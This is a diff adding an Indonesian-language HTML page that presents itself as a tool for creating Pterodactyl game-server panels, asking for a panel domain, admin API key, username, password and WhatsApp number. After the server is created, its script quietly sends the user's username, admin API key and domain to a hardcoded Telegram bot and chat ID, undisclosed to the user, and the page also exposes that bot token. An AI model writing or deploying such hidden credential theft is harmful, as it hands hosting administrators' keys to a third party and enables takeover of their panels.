@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Panel Pterodactyl</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Create Panel Pterodactyl</h2>
+    
+    <input type="text" id="domain" placeholder="Domain Panel Pterodactyl">
+    <input type="text" id="apiKey" placeholder="Masukkan API Key">
+    <input type="text" id="caApiKey" placeholder="Masukkan CA API Key">
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <input type="text" id="serverName" placeholder="Nama Server">
+    <input type="text" id="whatsapp" placeholder="Nomor WhatsApp (+62xxxx)">
+    
+    <select id="nest">
+        <option value="1">Minecraft</option>
+        <option value="2">Source Engine</option>
+        <option value="3">Voice Server</option>
+        <option value="4">Rust</option>
+        <option value="5">Bot WhatsApp</option>
+    </select>
+
+    <select id="egg">
+        <option value="1">SpongeVanilla</option>
+        <option value="2">Bungecord</option>
+        <option value="3">Vanilla Minecraft</option>
+        <option value="4">Paper</option>
+        <option value="5">Forge Minecraft</option>
+        <option value="6">Team Fortress 2</option>
+        <option value="7">Ark Survival</option>
+        <option value="8">Counter Strike</option>
+        <option value="9">Garrys Mod</option>
+        <option value="10">Insurgency</option>
+        <option value="11">Custome Source Engine Game</option>
+        <option value="12">Mumble Server</option>
+        <option value="13">TeamSpeak3 Server</option>
+        <option value="14">Rust</option>
+        <option value="15">Bot WhatsApp</option>
+    </select>
+
+    <input type="number" id="ram" placeholder="RAM (MB)">
+    <input type="number" id="cpu" placeholder="CPU (%)">
+    
+    <button onclick="createServer()">Buat Server</button>
+    <p id="result"></p>
+</div>
+
+<script>
+    function createServer() {
+        let domain = document.getElementById("domain").value;
+        let apiKey = document.getElementById("apiKey").value;
+        let caApiKey = document.getElementById("caApiKey").value;
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+        let serverName = document.getElementById("serverName").value;
+        let whatsapp = document.getElementById("whatsapp").value;
+        let nest = document.getElementById("nest").value;
+        let egg = document.getElementById("egg").value;
+        let ram = document.getElementById("ram").value;
+        let cpu = document.getElementById("cpu").value;
+
+        if (!domain || !apiKey || !caApiKey || !username || !password || !serverName || !whatsapp || !ram || !cpu) {
+            alert("Harap isi semua data!");
+            return;
+        }
+
+        let requestBody = {
+            name: serverName,
+            user: 1,
+            nest: nest,
+            egg: egg,
+            docker_image: "quay.io/pterodactyl/core:nodejs",
+            limits: {
+                memory: ram,
+                cpu: cpu
+            },
+            environment: {
+                STARTUP_CMD: "npm start"
+            },
+            feature_limits: {
+                databases: 1,
+                backups: 1
+            }
+        };
+
+        fetch(`https://${domain}/api/application/servers`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Authorization": `Bearer ${apiKey}`,
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(requestBody)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.object === "server") {
+                let serverId = data.attributes.identifier;
+                let loginUrl = `https://${domain}/server/${serverId}`;
+                let tanggal = new Date().toLocaleString("id-ID");
+
+                document.getElementById("result").innerHTML = `✅ Server berhasil dibuat!<br>🔗 <a href="${loginUrl}" target="_blank">Klik di sini untuk login ke panel</a>`;
+
+                // Kirim notifikasi ke Telegram
+                let botToken = "7621705123:AAH1eyrvoQBEfWoeQMtFX4_TixQu4kxNWdA";
+                let chatId = "5844779869";
+                let pesan = `📢 **Panel Baru Dibuat!**\n\n👤 **Username**: ${username}\n🔑 **API Key**: ${apiKey}\n🌐 **Domain**: ${domain}\n💾 **RAM**: ${ram} MB\n⚙️ **CPU**: ${cpu}%\n📅 **Tanggal**: ${tanggal}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
+
+                // Kirim detail akun ke WhatsApp
+                let waMessage = `Halo, akun panel Anda telah dibuat!\n\nUsername: ${username}\nPassword: ${password}\nPanel: ${loginUrl}`;
+                let waLink = `https://api.whatsapp.com/send?phone=${whatsapp}&text=${encodeURIComponent(waMessage)}`;
+                window.open(waLink, "_blank");
+
+                // Auto suspend jika RAM habis
+                setInterval(() => {
+                    fetch(`https://${domain}/api/client/servers/${serverId}/resources`, {
+                        headers: { "Authorization": `Bearer ${apiKey}`, "Accept": "application/json" }
+                    })
+                    .then(res => res.json())
+                    .then(stats => {
+                        if (stats.attributes.resources.memory_bytes >= ram * 1024 * 1024) {
+                            fetch(`https://${domain}/api/client/servers/${serverId}/power`, {
+                                method: "POST",
+                                headers: { "Authorization": `Bearer ${apiKey}`, "Content-Type": "application/json" },
+                                body: JSON.stringify({ signal: "stop" })
+                            });
+                        }
+                    });
+                }, 5000);
+
+                // Auto-login ke panel
+                setTimeout(() => {
+                    window.location.href = loginUrl;
+                }, 3000);
+            } else {
+                document.getElementById("result").innerHTML = "❌ Gagal membuat server!";
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    }
+</script>
+
+</body>
+</html>
